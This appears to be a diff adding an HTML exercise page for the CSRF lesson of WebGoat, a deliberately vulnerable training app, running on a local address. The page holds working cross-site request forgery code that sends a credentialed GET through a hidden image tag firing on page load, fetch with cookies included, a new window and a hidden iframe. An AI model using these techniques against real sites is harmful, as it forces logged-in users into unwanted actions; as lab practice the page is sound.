@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Basic GET</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .info {
+            background-color: #e3f2fd;
+            padding: 15px;
+            border-left: 4px solid #2196F3;
+            margin: 20px 0;
+        }
+        .warning {
+            background-color: #fff3e0;
+            padding: 15px;
+            border-left: 4px solid #ff9800;
+            margin: 20px 0;
+        }
+        .success {
+            background-color: #e8f5e9;
+            padding: 15px;
+            border-left: 4px solid #4caf50;
+            margin: 20px 0;
+        }
+        button {
+            background-color: #2196F3;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 10px 5px;
+        }
+        button:hover {
+            background-color: #1976D2;
+        }
+        code {
+            background-color: #f5f5f5;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+        }
+        #response {
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #f5f5f5;
+            border-radius: 4px;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 CSRF Attack - Basic GET</h1>
+        
+        <div class="info">
+            <strong>What is CSRF?</strong><br>
+            Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application.
+        </div>        <div class="warning">
+            <strong>Prerequisites:</strong><br>
+            ✓ You must be logged into WebGoat in the same browser<br>
+            ✓ WebGoat must be running on http://192.168.254.112:8001<br>
+            ✓ Open this HTML file in your browser (double-click it)
+        </div>
+
+        <h2>Method 1: Auto-trigger with Image Tag</h2>
+        <p>The image tag below will automatically trigger the GET request when this page loads:</p>
+        <img src="http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag"
+             style="display:none;" 
+             onerror="handleImageError()" 
+             onload="handleImageLoad()">
+        
+        <h2>Method 2: Manual Trigger with Fetch</h2>
+        <button onclick="triggerCSRF()">Trigger CSRF Attack</button>
+        
+        <h2>Method 3: Open in New Window</h2>
+        <button onclick="openInNewWindow()">Open Attack URL in New Window</button>
+
+        <h2>Method 4: Create Iframe</h2>
+        <button onclick="createIframe()">Trigger via Iframe</button>
+
+        <div id="response"></div>
+
+        <div class="success" id="instructions" style="display:none;">
+            <strong>✓ Attack Complete!</strong><br>
+            Check the response above for the flag value. Copy it and paste it back in WebGoat.
+        </div>
+    </div>    <script>
+        const targetURL = 'http://192.168.254.112:8001/WebGoat/csrf/basic-get-flag';
+        
+        function displayResponse(message, isError = false) {
+            const responseDiv = document.getElementById('response');
+            responseDiv.style.display = 'block';
+            responseDiv.style.backgroundColor = isError ? '#ffebee' : '#e8f5e9';
+            responseDiv.textContent = message;
+            
+            if (!isError) {
+                document.getElementById('instructions').style.display = 'block';
+            }
+        }
+
+        function handleImageLoad() {
+            displayResponse('✓ Image-based CSRF triggered successfully!\nThe flag should now be generated. Check WebGoat for the flag value.');
+        }
+
+        function handleImageError() {
+            console.log('Image tag triggered (error expected for non-image response)');
+            // This is actually expected - the endpoint doesn't return an image
+        }
+
+        async function triggerCSRF() {
+            displayResponse('Sending CSRF request...');
+            
+            try {
+                const response = await fetch(targetURL, {
+                    method: 'GET',
+                    credentials: 'include' // Important: include cookies
+                });
+                
+                const data = await response.text();
+                
+                if (response.ok) {
+                    displayResponse('✓ CSRF Attack Successful!\n\nResponse:\n' + data);
+                    
+                    // Try to parse JSON and extract flag
+                    try {
+                        const json = JSON.parse(data);
+                        if (json.flag) {
+                            displayResponse('✓ CSRF Attack Successful!\n\nFlag Found: ' + json.flag + '\n\nFull Response:\n' + data);
+                        }
+                    } catch (e) {
+                        // Not JSON, just display the text
+                    }
+                } else {
+                    displayResponse('Request sent but received status: ' + response.status + '\n\nResponse:\n' + data, true);
+                }            } catch (error) {
+                displayResponse('Error: ' + error.message + '\n\nMake sure:\n1. WebGoat is running on http://192.168.254.112:8001\n2. You are logged into WebGoat\n3. You are on the CSRF lesson page', true);
+            }
+        }
+
+        function openInNewWindow() {
+            displayResponse('Opening attack URL in new window...');
+            window.open(targetURL, '_blank');
+            setTimeout(() => {
+                displayResponse('✓ New window opened!\nCheck the new window for the response, then check WebGoat for the flag.');
+            }, 500);
+        }
+
+        function createIframe() {
+            displayResponse('Creating hidden iframe to trigger CSRF...');
+            
+            // Remove any existing iframe
+            const existingIframe = document.getElementById('csrf-iframe');
+            if (existingIframe) {
+                existingIframe.remove();
+            }
+            
+            // Create new iframe
+            const iframe = document.createElement('iframe');
+            iframe.id = 'csrf-iframe';
+            iframe.src = targetURL;
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                displayResponse('✓ Iframe created and request sent!\nCheck WebGoat for the flag value.');
+            }, 1000);
+        }
+
+        // Auto-trigger on page load (commented out by default)
+        // window.onload = function() {
+        //     setTimeout(triggerCSRF, 1000);
+        // };
+    </script>
+</body>
+</html>
